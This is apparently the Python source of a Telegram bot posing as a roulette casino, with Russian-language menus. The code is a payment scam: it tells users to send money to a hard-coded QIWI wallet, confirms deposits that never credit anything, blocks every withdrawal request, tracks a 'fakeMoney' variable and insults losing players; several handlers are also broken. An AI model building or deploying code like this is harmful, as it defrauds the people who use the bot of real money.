# -*- coding: utf-8 -*-

import telebot
import config
import random
from telebot import types
import time

bot = telebot.TeleBot(config.token)
user = bot.get_me()

fakeMoney = 0

@bot.message_handler(commands=['start'])
def response_go(m):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Баланс']])
    time.sleep(1)
    msg = bot.send_message(m.chat.id, 'Начнем', reply_markup=keyboard)
    bot.register_next_step_handler(msg, selected_main_menu)

def selected_main_menu(m):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    if m.text == 'Играть':
        bot.send_message(m.chat.id, 'Пополните баланс для начала игры')
        keyboard.add(*[types.KeyboardButton(name) for name in ['Вернуться']])
    elif m.text == 'Баланс':
        keyboard.add(*[types.KeyboardButton(name) for name in ['Пополнить', 'Вывести', 'Вернуться']])
    msg = bot.send_message(m.chat.id, 'Выбери нужное:', reply_markup=keyboard)
    bot.register_next_step_handler(msg, handle_child_menu)

def handle_child_menu(m):
    if m.text == 'Вернуться':
        response_go(m)
    elif m.text == 'Пополнить':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(*[types.KeyboardButton(name) for name in ['150', '250', '350', '500', '1000',  'Вернуться']])
        msg = bot.send_message(m.chat.id, 'Сумма пополнения:', reply_markup=keyboard)
        bot.register_next_step_handler(msg, to_up_ballance)
    elif m.text == 'Вывести':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Вернуться']])
        msg = bot.send_message(m.chat.id, 'Введите сумму которую хотите вывести:', reply_markup=keyboard)
        bot.register_next_step_handler(msg, widthdraw_money) 
    elif m.text == 'Черное' or m.text == 'Красное':
        if (random.randint(1, 2) == 1):
            bot.send_message(m.chat.id, 'Вы выиграли ...')
            response_go(m)
        else:
            bot.send_message(m.chat.id, 'Лох ...')
            response_go(m)

def widthdraw_money(m):
    if m.text == 'Вернуться':
        response_go(m)
    else:
        if m.text.isdigit():
            bot.send_message(m.chat_id, 'Вы не можете вывести средства!')
        else:
            bot.send_message(m.chat.id, 'Неверно введена сумма для вывода')
            response_go(m)    


def to_up_ballance(m):
    if m.text == 'Вернуться':
        response_go(m)
    else:
        response_go(m)
        amount = int(m.text + '00')
        prices = [types.LabeledPrice(label='Пополнение вашего баланса', amount=amount), types.LabeledPrice('Комиссия', 1500)]
        fakeMoney = m.text
        bot.send_message(m.chat.id, 'Переведите ' + m.text + 'руб. На qiwi кошелек: +79308162369. Код: 4221')

@bot.shipping_query_handler(func=lambda query: True)
def shipping(shipping_query):
    print(shipping_query)
    bot.answer_shipping_query(shipping_query.id, ok=True, shipping_options=shipping_options,
                              error_message='Oh, seems like our Dog couriers are having a lunch right now. Try again later!')


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    print(pre_checkout_query)
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True,
                                  error_message="Aliens tried to steal your card's CVV, but we successfully protected your credentials,"
                                                " try to pay again in a few minutes, we need a small rest.")

@bot.message_handler(content_types=['successful_payment', 'invoice'])
def got_payment(m):
    print(m)
    bot.send_message(m.chat.id, 'Платеж подтвержден. Деньги поступят на ваш счет в течение 10 минут. Удачной игры!')
    response_go(m)

if __name__ == '__main__':
    bot.polling(none_stop=True)